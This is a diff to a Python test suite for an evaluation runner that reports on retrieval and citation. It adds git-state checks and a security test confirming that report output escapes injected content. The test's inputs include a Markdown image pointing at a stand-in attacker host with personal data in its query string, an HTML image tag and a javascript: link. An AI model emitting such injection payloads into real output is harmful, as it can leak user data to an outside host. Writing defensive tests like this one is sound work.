@@ -4,6 +4,7 @@ The real run is the owner's live check (O5), recorded in docs/TESTING.md.
 """
 
 import json
+import re
 from decimal import Decimal
 
 import httpx2
@@ -117,12 +118,12 @@ def test_a_run_reports_the_sources_found_cited_and_expected(index):
     assert "  cited: #1 (S1)" in lines
     assert "  tools: none" in lines
     assert "  expected #1 #3: found #1, cited #1" in lines
-    assert "  plan: needs_tool yes, needs_profile yes; filters: none; profile sent: yes" in lines
+    assert "  searches: 3 found, filters: none" in lines
 
 
 def test_with_no_expected_source_the_summary_says_whether_anything_is_cited(index):
     """An off-topic question cites nothing; a cited source is flagged for checking."""
-    off_topic = ScriptedTranslator(plans=[plan_json([OFF_TOPIC], needs_tool=False)])
+    off_topic = ScriptedTranslator(plans=[plan_json([OFF_TOPIC] * 3)])
     [skipped] = _evaluate([_item("q11", OFF_TOPIC)], index, ScriptedChatModel(), off_topic)
     assert skipped.result.kind == "no_sources"
     assert skipped.chunks == ()
@@ -150,6 +151,30 @@ def test_chunks_found_by_keyword_only_are_marked(tmp_path):
         "**S2** #9 Made-up article 9 (2029) · Results · keyword only"
         in run_evaluation.report_text([run], run_evaluation.datetime(2026, 10, 21))
     )
+
+
+@pytest.mark.parametrize(
+    "query",
+    [
+        "![x](https://attacker.example/p?q=80kg)",
+        '<img src="https://attacker.example/p">',
+        "[click](javascript:alert(1))",
+    ],
+    ids=["image", "html image", "javascript link"],
+)
+def test_a_query_cannot_add_an_image_or_link_to_the_report(index, query):
+    """The model's query and rewrites are escaped Markdown in the report (security review, #46)."""
+    model = ScriptedChatModel(
+        replies=[tool_reply(("search_knowledge_base", {"query": query})), AIMessage(ANSWER)],
+        search_first=False,
+    )
+    translator = ScriptedTranslator(plans=[plan_json([query, f"{query} b", f"{query} c"])])
+    [run] = _evaluate([_item("q1", QUESTION)], index, model, translator)
+    report = run_evaluation.report_text([run], run_evaluation.datetime(2026, 10, 29))
+    [line] = [line for line in report.splitlines() if line.startswith("**Search 1:**")]
+    assert query not in line
+    # Every bracket is escaped, so no link, image or tag is read from the line.
+    assert re.search(r"(?<!\\)[\[\]<>]", line) is None
 
 
 def test_the_profile_reaches_the_tools_only_in_the_profile_run(index):
@@ -327,7 +352,7 @@ def test_each_run_asks_in_the_answer_language_given(index, language):
         prices=None,
         language=language,
     )
-    [[system, _]] = model.calls
+    system = model.calls[-1][0]
     assert system.content.endswith(TEST_LANGUAGE_PARTS[language])
 
 
@@ -336,7 +361,7 @@ def test_main_runs_in_the_language_asked_and_says_so(real_pieces, tmp_path, caps
     """English by default, German with --language de; the summary and the report name it."""
     item = {"id": "de1", "question": QUESTION, "expected_sources": [], "good_answer": "x"}
     assert run_evaluation.main([*args, _questions_file(tmp_path, [item])]) == 0
-    [[system, _]] = real_pieces.calls
+    system = real_pieces.calls[-1][0]
     assert system.content.endswith(TEST_LANGUAGE_PARTS[language])
     assert f"Answer language: {language}" in capsys.readouterr().out
     [report] = (tmp_path / "eval_runs").glob("run-*.md")
@@ -502,15 +527,53 @@ def test_the_commit_is_read_from_the_code_that_ran_not_the_working_folder(
     def fake_state(folder):
         """Record the folder asked about and answer like a clean checkout."""
         seen.append(folder)
-        return run_evaluation.eval_results.GitState("e" * 40, False)
+        return run_evaluation.eval_results.GitState("e" * 40, False, "x")
 
     monkeypatch.setattr(run_evaluation.eval_results, "git_state", fake_state)
     monkeypatch.chdir(tmp_path)
     item = {"id": "q1", "question": QUESTION, "expected_sources": [], "good_answer": "x"}
     assert run_evaluation.main([_questions_file(tmp_path, [item])]) == 0
-    assert seen == [config.PROJECT_ROOT]
+    assert seen == [config.PROJECT_ROOT] * 2
     _, document = _results_file(tmp_path)
     assert (document["commit"], document["dirty"]) == ("e" * 40, False)
+    assert document["changed_during_run"] is False
+
+
+def test_a_commit_made_during_the_run_is_not_recorded_as_the_code_that_ran(
+    real_pieces, tmp_path, monkeypatch, capsys
+):
+    """The state is read before the first question; a later commit is noted, not kept (T9.21)."""
+    git_state = run_evaluation.eval_results.GitState
+    states = iter([git_state("a" * 40, False, "x"), git_state("b" * 40, False, "x")])
+    asked = []
+
+    def fake_state(folder):
+        """Answer with the start's commit, then a newer one; record the model calls made so far."""
+        asked.append(len(real_pieces.calls))
+        return next(states)
+
+    monkeypatch.setattr(run_evaluation.eval_results, "git_state", fake_state)
+    item = {"id": "q1", "question": QUESTION, "expected_sources": [], "good_answer": "x"}
+    assert run_evaluation.main([_questions_file(tmp_path, [item])]) == 0
+    # The first read comes before the answer model is called, the second after the questions
+    # (since T9.3 a question is a search call and an answer call, so count them, not 1).
+    assert asked == [0, len(real_pieces.calls)] and asked[1] > 0
+    _, document = _results_file(tmp_path)
+    assert (document["commit"], document["commit_at_end"]) == ("a" * 40, "b" * 40)
+    assert document["changed_during_run"] is True
+    out = capsys.readouterr().out
+    assert "Note: the code changed during the run (HEAD moved from aaaaaaa to bbbbbbb)" in out
+
+
+def test_no_change_note_is_printed_when_the_code_stayed_the_same(
+    real_pieces, tmp_path, monkeypatch, capsys
+):
+    """With the same state at both ends, the output has no change note."""
+    same = run_evaluation.eval_results.GitState("a" * 40, True, "x")
+    monkeypatch.setattr(run_evaluation.eval_results, "git_state", lambda folder: same)
+    item = {"id": "q1", "question": QUESTION, "expected_sources": [], "good_answer": "x"}
+    assert run_evaluation.main([_questions_file(tmp_path, [item])]) == 0
+    assert "code changed" not in capsys.readouterr().out
 
 
 def test_the_results_file_holds_no_text_from_the_answer_the_chunks_or_the_key(
@@ -559,8 +622,8 @@ def test_a_turn_that_ends_in_an_error_is_in_the_results_file(real_pieces, tmp_pa
     [record] = document["runs"]
     assert record["kind"] == "error"
     assert record["code"]
-    # The chunks were found before the answer call failed; nothing was cited.
-    assert record["expected_found"] == ["1"]
+    # The model failed at its first call, before it searched: nothing found or cited.
+    assert record["expected_found"] == []
     assert record["expected_cited"] == []
     assert "test" not in json.dumps(record)
 
